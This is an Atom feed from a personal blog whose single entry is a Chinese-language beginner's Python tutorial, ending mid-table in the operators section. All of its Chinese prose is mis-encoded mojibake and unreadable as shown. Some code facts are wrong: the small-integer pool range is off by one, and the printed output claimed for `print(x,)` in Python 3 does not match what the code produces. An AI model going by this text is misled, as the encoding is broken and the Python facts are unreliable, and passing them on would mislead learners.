<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jesse&#39;s home</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jesse.top/"/>
  <updated>2020-05-26T15:34:04.241Z</updated>
  <id>https://jesse.top/</id>
  
  <author>
    <name>Jesse</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>01.Pythonä¹‹è·¯ - PythonåŸºç¡€</title>
    <link href="https://jesse.top/2020/05/26/python/01-basic/01-Python%E4%B9%8B%E8%B7%AF-Python%E5%9F%BA%E7%A1%80/"/>
    <id>https://jesse.top/2020/05/26/python/01-basic/01-Pythonä¹‹è·¯-PythonåŸºç¡€/</id>
    <published>2020-05-26T14:59:58.000Z</published>
    <updated>2020-05-26T15:34:04.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pythonä¹‹è·¯-PythonåŸºç¡€"><a href="#Pythonä¹‹è·¯-PythonåŸºç¡€" class="headerlink" title="Pythonä¹‹è·¯ - PythonåŸºç¡€"></a>Pythonä¹‹è·¯ - PythonåŸºç¡€</h1><h2 id="Hello-World-ğŸ€"><a href="#Hello-World-ğŸ€" class="headerlink" title="Hello World  ğŸ€"></a>Hello World  ğŸ€</h2><p>å­¦ä¸€é—¨è¯­è¨€åŸºæœ¬éƒ½æ˜¯ä»Hello Worldå¼€å§‹çš„ , å¦‚ä¸‹ä¸€ä¸ªæœ€ç®€å•çš„Hello Worldç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.5</span><span class="number">.2</span> (v3<span class="number">.5</span><span class="number">.2</span>:<span class="number">4</span>def2a2901a5, Jun <span class="number">25</span> <span class="number">2016</span>, <span class="number">22</span>:<span class="number">18</span>:<span class="number">55</span>) [MSC v<span class="number">.1900</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"Hello World"</span>)</span><br><span class="line">Hello World</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>æ­¤ä¸ºPython 3.5.2ç‰ˆæœ¬ , ä¸Šè¿°ä»£ç ä¸ºåœ¨Windowsç¯å¢ƒå‘½ä»¤è¡Œä¸­æ‰§è¡Œ , å³ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ â€œå‘½ä»¤æç¤ºç¬¦â€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å·²æ·»åŠ ç¯å¢ƒå˜é‡</span></span><br><span class="line">C:\Windows\system32&gt;python</span><br></pre></td></tr></table></figure><p>Python 2.7.x ç‰ˆæœ¬çš„Hello Worldç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.13</span> (v2<span class="number">.7</span><span class="number">.13</span>:a06454b1afa1, Dec <span class="number">17</span> <span class="number">2016</span>, <span class="number">20</span>:<span class="number">53</span>:<span class="number">40</span>) [MSC v<span class="number">.1500</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"Hello World"</span></span><br><span class="line">Hello World</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä½¿ç”¨<code>Python shell</code> ä»…ä»…é€‚åˆå¤„ç†ä¸€äº›éå¸¸ç®€å•çš„å°ç¨‹åº , å¯¹äºæ¯”è¾ƒå¤æ‚ , ä»£ç é‡ç¨å¾®å¤§ä¸€ç‚¹çš„å°±ä¸é€‚åˆäº†</p><a id="more"></a><h2 id="å˜é‡-ğŸ€"><a href="#å˜é‡-ğŸ€" class="headerlink" title="å˜é‡  ğŸ€"></a>å˜é‡  ğŸ€</h2><p>å˜é‡ç”¨äºå­˜å‚¨åœ¨è®¡ç®—æœºç¨‹åºä¸­è¢«å¼•ç”¨å’Œæ“ä½œçš„ä¿¡æ¯</p><p>å˜é‡å¯èƒ½è¢«æ˜ç¡®ä¸ºæ˜¯èƒ½è¡¨ç¤ºå¯å˜çŠ¶æ€ã€å…·æœ‰å­˜å‚¨ç©ºé—´çš„æŠ½è±¡(å¦‚åœ¨Javaå’ŒVisual Basicä¸­) , å˜é‡çš„å”¯ä¸€ç›®çš„æ˜¯åœ¨å†…å­˜ä¸­æ ‡è®°å’Œå­˜å‚¨æ•°æ® , è¿™äº›æ•°æ®å¯ä»¥åœ¨æ•´ä¸ªç¨‹åºä¸­ä½¿ç”¨</p><p>å£°æ˜å˜é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å£°æ˜ä¸€ä¸ªå˜é‡name,å¹¶ç»‘å®šå€¼"Lyon"</span></span><br><span class="line">name = <span class="string">"Lyon"</span></span><br><span class="line"><span class="comment"># åŒæ—¶ä¸ºå¤šä¸ªå˜é‡èµ‹å€¼</span></span><br><span class="line">a = b = c = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>Pythonå˜é‡å®šä¹‰çš„è§„åˆ™ : </p><ol><li><p>å˜é‡ååªèƒ½æ˜¯ å­—æ¯ã€æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿çš„ä»»æ„ç»„åˆ</p></li><li><p>å˜é‡åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—</p></li><li><p>ä»¥ä¸‹å…³é”®å­—ä¸èƒ½å£°æ˜ä¸ºå˜é‡å , å±äºPythonä¸­çš„ä¿ç•™å­—and</p></li></ol><table><thead><tr><th>and</th><th>exec</th><th>not</th></tr></thead><tbody><tr><td>assert</td><td>finally</td><td>or</td></tr><tr><td>break</td><td>for</td><td>pass</td></tr><tr><td>class</td><td>from</td><td>print</td></tr><tr><td>continue</td><td>global</td><td>raise</td></tr><tr><td>def</td><td>if</td><td>return</td></tr><tr><td>del</td><td>import</td><td>try</td></tr><tr><td>elif</td><td>in</td><td>while</td></tr><tr><td>else</td><td>is</td><td>with</td></tr><tr><td>except</td><td>lambda</td><td>yield</td></tr></tbody></table><h2 id="è¡Œå’Œç¼©è¿›-ğŸ€"><a href="#è¡Œå’Œç¼©è¿›-ğŸ€" class="headerlink" title="è¡Œå’Œç¼©è¿›  ğŸ€"></a>è¡Œå’Œç¼©è¿›  ğŸ€</h2><p>Python ä¸å…¶ä»–è¯­è¨€æœ€å¤§çš„åŒºåˆ«å°±æ˜¯ , Python çš„ä»£ç å—ä¸ä½¿ç”¨å¤§æ‹¬å· <code>{}</code> æ¥æ§åˆ¶ç±» , å‡½æ•°ä»¥åŠå…¶ä»–é€»è¾‘åˆ¤æ–­ ,  Python æœ€å…·ç‰¹è‰²çš„å°±æ˜¯ç”¨ç¼©è¿›æ¥å†™æ¨¡å—</p><p>ç¼©è¿›çš„ç©ºç™½æ•°é‡æ˜¯å¯å˜çš„ , ä½†æ˜¯æ‰€æœ‰ä»£ç å—è¯­å¥å¿…é¡»åŒ…å«ç›¸åŒçš„ç¼©è¿›ç©ºç™½æ•°é‡ , è¿™ä¸ªå¿…é¡»ä¸¥æ ¼æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"True"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"False"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">æ‰§è¡Œä¼šå‡ºç°é”™è¯¯æé†’:</span></span><br><span class="line"><span class="string">IndentationError: unexpected indent</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p><code>IndentationError: unexpected indent</code> é”™è¯¯æ˜¯Pythonç¼–è¯‘å™¨åœ¨å‘Šè¯‰ä½  , ä½ çš„æ–‡ä»¶é‡Œæ ¼å¼æœ‰é—®é¢˜ , å¯èƒ½æ˜¯tabå’Œç©ºæ ¼æ²¡å¯¹é½çš„é—®é¢˜</p><p>è¿˜æœ‰<code>IndentationError: unindent does not match any outer indentation level</code> é”™è¯¯è¡¨æ˜ , ä½ ä½¿ç”¨çš„ç¼©è¿›æ–¹å¼ä¸ä¸€è‡´ , æœ‰çš„æ˜¯ tab é”®ç¼©è¿› , æœ‰çš„æ˜¯ç©ºæ ¼ç¼©è¿› , æ”¹ä¸ºä¸€è‡´å³å¯ã€‚</p><p>å› æ­¤ , åœ¨ Python çš„ä»£ç å—ä¸­å¿…é¡»ä½¿ç”¨ç›¸åŒæ•°ç›®çš„è¡Œé¦–ç¼©è¿›ç©ºæ ¼æ•°</p><p>å»ºè®®ä½ åœ¨æ¯ä¸ªç¼©è¿›å±‚æ¬¡ä½¿ç”¨ <strong>å•ä¸ªåˆ¶è¡¨ç¬¦</strong> æˆ– <strong>ä¸¤ä¸ªç©ºæ ¼</strong> æˆ– <strong>å››ä¸ªç©ºæ ¼</strong> , åˆ‡è®°ä¸èƒ½æ··ç”¨</p><h2 id="å¤šè¡Œè¯­å¥-ğŸ€"><a href="#å¤šè¡Œè¯­å¥-ğŸ€" class="headerlink" title="å¤šè¡Œè¯­å¥  ğŸ€"></a>å¤šè¡Œè¯­å¥  ğŸ€</h2><p>Pythonè¯­å¥ä¸­ä¸€èˆ¬ä»¥æ–°ä½œä¸ºä¸ºè¯­å¥çš„ç»“æŸç¬¦</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–œæ  <code>\</code> å°†ä¸€è¡Œçš„è¯­å¥åˆ†ä¸ºå¤šè¡Œæ˜¾ç¤º , å¦‚ä¸‹ :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure><p>è¯­å¥ä¸­åŒ…å« [], {} æˆ– () æ‹¬å·å°±ä¸éœ€è¦ä½¿ç”¨å¤šè¡Œè¿æ¥ç¬¦ , å¦‚ä¸‹å®ä¾‹ : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">days = [<span class="string">'Monday'</span>, <span class="string">'Tuesday'</span>, <span class="string">'Wednesday'</span>,</span><br><span class="line">        <span class="string">'Thursday'</span>, <span class="string">'Friday'</span>]</span><br></pre></td></tr></table></figure><p><strong>åŒä¸€è¡Œä½¿ç”¨å¤šæ¡è¯­å¥</strong></p><p>Pythonå¯ä»¥åœ¨åŒä¸€è¡Œä¸­ä½¿ç”¨å¤šæ¡è¯­å¥ , è¯­å¥ä¹‹é—´ä½¿ç”¨åˆ†å· <code>;</code>  åˆ†å‰² , å¦‚ä¸‹ :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">'runoob'</span>; sys.stdout.write(x + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²-ğŸ€"><a href="#å­—ç¬¦ä¸²-ğŸ€" class="headerlink" title="å­—ç¬¦ä¸²  ğŸ€"></a>å­—ç¬¦ä¸²  ğŸ€</h2><p>Python å¯ä»¥ä½¿ç”¨å¼•å·( <strong>â€˜</strong> )ã€åŒå¼•å·( <strong>â€œ</strong> )ã€ä¸‰å¼•å·( <strong>â€˜â€™â€™</strong> æˆ– <strong>â€œâ€â€</strong> ) æ¥è¡¨ç¤ºå­—ç¬¦ä¸² , å¼•å·çš„å¼€å§‹ä¸ç»“æŸå¿…é¡»çš„ç›¸åŒç±»å‹çš„</p><p>å…¶ä¸­ä¸‰å¼•å·å¯ä»¥ç”±å¤šè¡Œç»„æˆ , ç¼–å†™å¤šè¡Œæ–‡æœ¬çš„å¿«æ·è¯­æ³• , å¸¸ç”¨äºæ–‡æ¡£å­—ç¬¦ä¸² , åœ¨æ–‡ä»¶çš„ç‰¹å®šåœ°ç‚¹ , è¢«å½“åšæ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">'word'</span></span><br><span class="line">sentence = <span class="string">"This is a sentence"</span></span><br><span class="line">paragraph = <span class="string">"""This is a paragraph</span></span><br><span class="line"><span class="string">   Contains multiple statements"""</span></span><br></pre></td></tr></table></figure><h2 id="æ³¨é‡Š-ğŸ€"><a href="#æ³¨é‡Š-ğŸ€" class="headerlink" title="æ³¨é‡Š  ğŸ€"></a>æ³¨é‡Š  ğŸ€</h2><p>Pythonä¸­å•è¡Œæ³¨é‡Šé‡‡ç”¨ <code>#</code> å¼€å¤´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªæ³¨é‡Š</span></span><br><span class="line">print(<span class="string">"Hello,Python"</span>)  <span class="comment"># ç¬¬äºŒä¸ªæ³¨é‡Š</span></span><br></pre></td></tr></table></figure><p>Pythonä¸­å¤šè¡Œæ³¨é‡Šé‡‡ç”¨ä¸‰ä¸ªå•å¼•å· <code>&#39;&#39;&#39;</code> æˆ–ä¸‰ä¸ªåŒå¼•å· <code>&quot;&quot;&quot;</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">è¿™æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨å•å¼•å·ã€‚</span></span><br><span class="line"><span class="string">è¿™æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨å•å¼•å·ã€‚</span></span><br><span class="line"><span class="string">è¿™æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨å•å¼•å·ã€‚</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">è¿™æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨åŒå¼•å·ã€‚</span></span><br><span class="line"><span class="string">è¿™æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨åŒå¼•å·ã€‚</span></span><br><span class="line"><span class="string">è¿™æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨åŒå¼•å·ã€‚</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ç¼–ç -ğŸ€"><a href="#å­—ç¬¦ç¼–ç -ğŸ€" class="headerlink" title="å­—ç¬¦ç¼–ç   ğŸ€"></a>å­—ç¬¦ç¼–ç   ğŸ€</h2><p>Pythonè§£é‡Šå™¨åœ¨åŠ è½½ <code>.py</code> æ–‡ä»¶ä¸­çš„ä»£ç æ—¶ , ä¼šå¯¹å†…å®¹è¿›è¡Œç¼–ç  (é»˜è®¤ASCII)</p><p>ç„¶è€ŒASCIIæ˜¯æ— æ³•å¤„ç†ä¸­æ–‡çš„ , æ‰€ä»¥å¦‚æœæˆ‘ä»¬çš„ä»£ç ä¸­å‡ºç°äº†ä¸­æ–‡ , é‚£ä¹ˆéœ€è¦åœ¨ä»£ç çš„é¡¶ç«¯åŠ ä¸Šä¸€å¥å£°æ˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ç¬¬ä¸€è¡Œ,ä¸ºè„šæœ¬è¯­è¨€æŒ‡å®šè§£é‡Šå™¨</span></span><br><span class="line"><span class="string">ç¬¬äºŒè¡Œ,å‘Šè¯‰Pythonè§£é‡Šå™¨,ç”¨utf-8ç¼–ç æ¥è¿›è¡Œç¼–ç </span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="ç”¨æˆ·è¾“å…¥-ğŸ€"><a href="#ç”¨æˆ·è¾“å…¥-ğŸ€" class="headerlink" title="ç”¨æˆ·è¾“å…¥  ğŸ€"></a>ç”¨æˆ·è¾“å…¥  ğŸ€</h2><p>å½“æˆ‘ä»¬éœ€è¦ç”¨æˆ·è‡ªå·±è¾“å…¥ä¿¡æ¯æ—¶ , å°±å¯ä»¥ä½¿ç”¨<code>input</code> è¯­å¥ , å¦‚ä¸‹ : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®©ç”¨æˆ·è¿›è¡Œè¾“å…¥,å¹¶ç”¨å˜é‡nameæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å€¼</span></span><br><span class="line">name = input(<span class="string">"Please input your name:"</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç  , ä¼šä¸€ç›´ç­‰å¾…ç”¨æˆ·è¾“å…¥ , ç›´åˆ°ç”¨æˆ·æŒ‰å›è½¦é”®åæ‰ä¼šé€€å‡º</p><h2 id="è¾“å‡º-ğŸ€"><a href="#è¾“å‡º-ğŸ€" class="headerlink" title="è¾“å‡º  ğŸ€"></a>è¾“å‡º  ğŸ€</h2><p>å½“æˆ‘ä»¬éœ€è¦è®©æ§åˆ¶å°è¾“å‡ºä¸€äº›æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯æ—¶ , å¯ä»¥ä½¿ç”¨<code>print</code> è¯­å¥ , åœ¨Hello Worldé‡Œæˆ‘ä»¬å·²ç»è§åˆ°äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># Author:Lyon</span></span><br><span class="line">x = <span class="string">"a"</span></span><br><span class="line">y = <span class="string">"b"</span></span><br><span class="line"><span class="comment"># æ¢è¡Œè¾“å‡º</span></span><br><span class="line">print(x)</span><br><span class="line">print(y)</span><br><span class="line">print(<span class="string">'---------'</span>)</span><br><span class="line"><span class="comment"># ä¸æ¢è¡Œè¾“å‡º</span></span><br><span class="line">print(x,)</span><br><span class="line">print(y,)</span><br><span class="line"><span class="comment"># ä¸æ¢è¡Œè¾“å‡º</span></span><br><span class="line">print(x, y)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">æ‰§è¡Œç»“æœ:</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">a b a b</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="æ•°æ®ç±»å‹-ğŸ€"><a href="#æ•°æ®ç±»å‹-ğŸ€" class="headerlink" title="æ•°æ®ç±»å‹  ğŸ€"></a>æ•°æ®ç±»å‹  ğŸ€</h2><p>æˆ‘ä»¬çŸ¥é“åœ¨å˜é‡åˆ›å»ºæ—¶ , ä¼šåœ¨å†…å­˜ä¸­å¼€è¾Ÿä¸€ä¸ªç©ºé—´ , ç”¨æ¥å­˜æ”¾å˜é‡çš„å€¼ , è€Œè¿™äº›å˜é‡çš„å€¼å¯ä»¥æ˜¯å„ç§å„æ ·çš„ç±»å‹ ,  å¦‚ : æ•°å­— , å­—ç¬¦ä¸² , åˆ—è¡¨ , å…ƒç»„ , å­—å…¸ , é›†åˆç­‰ç­‰</p><p><strong>æ•°å­—ç±»å‹</strong></p><ol><li><p>int (æ•´å‹)</p><p>æ•´æ•°çš„å¤§å°èŒƒå›´ç”±è®¡ç®—æœºå­—é•¿ç¡®å®š</p></li><li><p>long (é•¿æ•´å‹)</p><p>è·ŸCè¯­è¨€ä¸åŒ , Pythonçš„é•¿æ•´æ•°æ²¡æœ‰æŒ‡å®šä½å®½ , å³ : Pythonæ²¡æœ‰é™åˆ¶é•¿æ•´æ•°æ•°å€¼çš„å¤§å° , ä½†å®é™…ä¸Šç”±äºæœºå™¨å†…å­˜æœ‰é™ , æˆ‘ä»¬ä½¿ç”¨çš„é•¿æ•´æ•°æ•°å€¼ä¸å¯èƒ½æ— é™å¤§</p><p>æ³¨æ„ , è‡ªä»Python 2.2 èµ· , å¦‚æœæ•´æ•°å‘ç”Ÿæº¢å‡º , Pythonä¼šè‡ªåŠ¨å°†æ•´æ•°æ•°æ®è½¬æ¢ä¸ºé•¿æ•´æ•° , æ‰€ä»¥å¦‚ä»Šåœ¨é•¿æ•´æ•°æ•°æ®åé¢ä¸åŠ å­—æ¯ L ä¹Ÿä¸ä¼šå¯¼è‡´ä¸¥é‡åæœäº†</p></li><li><p>float (æµ®ç‚¹å‹)</p><p>æµ®ç‚¹æ•°ç”¨æ¥å¤„ç†å®æ•° , å³å¸¦æœ‰å°æ•°çš„æ•°å­— , ç±»ä¼¼äºCè¯­è¨€ä¸­çš„doubleç±»å‹ , å 8ä¸ªå­—èŠ‚(64ä½) , å…¶ä¸­52ä½è¡¨ç¤ºåº• , 11ä½è¡¨ç¤ºæŒ‡æ•° , å‰©ä¸‹çš„ä¸€ä½è¡¨ç¤ºç¬¦å·</p></li><li><p>complex (å¤æ•°)</p><p>å¤æ•°ç”±å®æ•°éƒ¨åˆ†å’Œè™šæ•°éƒ¨åˆ†ç»„æˆï¼Œä¸€èˆ¬å½¢å¼ä¸ºx+yhï¼Œå…¶ä¸­çš„xæ˜¯å¤æ•°çš„å®æ•°éƒ¨åˆ†ï¼Œyæ˜¯å¤æ•°çš„è™šæ•°éƒ¨åˆ†ï¼Œè¿™é‡Œçš„xå’Œyéƒ½æ˜¯å®æ•°</p></li></ol><p>æ³¨ : Pythonä¸­å­˜åœ¨æ•´æ•°å°æ•°å­—æ±  : -5~257 , åœ¨æ­¤èŒƒå›´çš„æ•´æ•°æ•°å­—å…±äº«</p><p><strong>å¸ƒå°”å€¼</strong></p><p>å³çœŸæˆ–å‡ , 1æˆ–0</p><p>æ›´å¤šæ•°æ®ç±»å‹ , åç»­æ–‡ç« ä¸­è¯¦ç»†æ•´ç†</p><h2 id="æ•°æ®è¿ç®—-ğŸ€"><a href="#æ•°æ®è¿ç®—-ğŸ€" class="headerlink" title="æ•°æ®è¿ç®—  ğŸ€"></a>æ•°æ®è¿ç®—  ğŸ€</h2><p>ç®—æœ¯è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>+</td><td>åŠ  - ä¸¤ä¸ªå¯¹è±¡ç›¸åŠ </td><td>a + b è¾“å‡ºç»“æœ 30</td></tr><tr><td>-</td><td>å‡ - å¾—åˆ°è´Ÿæ•°æˆ–æ˜¯ä¸€ä¸ªæ•°å‡å»å¦ä¸€ä¸ªæ•°</td><td>a - b è¾“å‡ºç»“æœ -10</td></tr><tr><td>*</td><td>ä¹˜ - ä¸¤ä¸ªæ•°ç›¸ä¹˜æˆ–æ˜¯è¿”å›ä¸€ä¸ªè¢«é‡å¤è‹¥å¹²æ¬¡çš„å­—ç¬¦ä¸²</td><td>a * b è¾“å‡ºç»“æœ 200</td></tr><tr><td>/</td><td>é™¤ - xé™¤ä»¥y</td><td>b / a è¾“å‡ºç»“æœ 2</td></tr><tr><td>%</td><td>å–æ¨¡ - è¿”å›é™¤æ³•çš„ä½™æ•°</td><td>b % a è¾“å‡ºç»“æœ 0</td></tr><tr><td>**</td><td>å¹‚ - è¿”å›xçš„yæ¬¡å¹‚</td><td>a**b ä¸º10çš„20æ¬¡æ–¹ ,  è¾“å‡ºç»“æœ 100000000000000000000</td></tr><tr><td>//</td><td>å–æ•´é™¤ - è¿”å›å•†çš„æ•´æ•°éƒ¨åˆ†</td><td>9//2 è¾“å‡ºç»“æœ 4 , 9.0//2.0 è¾“å‡ºç»“æœ 4.0</td></tr></tbody></table><p>æ¯”è¾ƒè¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>==</td><td>ç­‰äº - æ¯”è¾ƒå¯¹è±¡æ˜¯å¦ç›¸ç­‰</td><td>(a == b) è¿”å› False</td></tr><tr><td>!=</td><td>ä¸ç­‰äº - æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ä¸ç›¸ç­‰</td><td>(a != b) è¿”å› True</td></tr><tr><td>&lt;&gt;</td><td>ä¸ç­‰äº - æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ä¸ç›¸ç­‰</td><td>(a &lt;&gt; b) è¿”å› Trueè¿™ä¸ªè¿ç®—ç¬¦ç±»ä¼¼ !=</td></tr><tr><td>&gt;</td><td>å¤§äº - è¿”å›xæ˜¯å¦å¤§äºy</td><td>(a &gt; b) è¿”å› False</td></tr><tr><td>&lt;</td><td>å°äº - è¿”å›xæ˜¯å¦å°äºy , æ‰€æœ‰æ¯”è¾ƒè¿ç®—ç¬¦è¿”å›1è¡¨ç¤ºçœŸ , è¿”å›0è¡¨ç¤ºå‡<br>è¿™åˆ†åˆ«ä¸ç‰¹æ®Šçš„å˜é‡Trueå’ŒFalseç­‰ä»· , æ³¨æ„ , è¿™äº›å˜é‡åçš„å¤§å†™</td><td>(a &lt; b) è¿”å› True</td></tr><tr><td>&gt;=</td><td>å¤§äºç­‰äº    - è¿”å›xæ˜¯å¦å¤§äºç­‰äºyã€‚</td><td>(a &gt;= b) è¿”å› False</td></tr><tr><td>&lt;=</td><td>å°äºç­‰äº - è¿”å›xæ˜¯å¦å°äºç­‰äºyã€‚</td><td>(a &lt;= b) è¿”å› True</td></tr></tbody></table><p>èµ‹å€¼è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>=</td><td>ç®€å•çš„èµ‹å€¼è¿ç®—ç¬¦</td><td>c = a + b å°† a + b çš„è¿ç®—ç»“æœèµ‹å€¼ä¸º c</td></tr><tr><td>+=</td><td>åŠ æ³•èµ‹å€¼è¿ç®—ç¬¦</td><td>c += a ç­‰æ•ˆäº c = c + a</td></tr><tr><td>-=</td><td>å‡æ³•èµ‹å€¼è¿ç®—ç¬¦</td><td>c -= a ç­‰æ•ˆäº c = c - a</td></tr><tr><td>*=</td><td>ä¹˜æ³•èµ‹å€¼è¿ç®—ç¬¦</td><td>c <em>= a ç­‰æ•ˆäº c = c </em> a</td></tr><tr><td>/=</td><td>é™¤æ³•èµ‹å€¼è¿ç®—ç¬¦</td><td>c /= a ç­‰æ•ˆäº c = c / a</td></tr><tr><td>%=</td><td>å–æ¨¡èµ‹å€¼è¿ç®—ç¬¦</td><td>c %= a ç­‰æ•ˆäº c = c % a</td></tr><tr><td>**=</td><td>å¹‚èµ‹å€¼è¿ç®—ç¬¦</td><td>c **= a ç­‰æ•ˆäº c = c ** a</td></tr><tr><td>//=</td><td>å–æ•´é™¤èµ‹å€¼è¿ç®—ç¬¦</td><td>c //= a ç­‰æ•ˆäº c = c // a</td></tr></tbody></table><p>ä½è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>&amp;</td><td>æŒ‰ä½ä¸è¿ç®—ç¬¦ : å‚ä¸è¿ç®—çš„ä¸¤ä¸ªå€¼ , å¦‚æœä¸¤ä¸ªç›¸åº”ä½éƒ½ä¸º1 , åˆ™è¯¥ä½çš„ç»“æœä¸º1 , 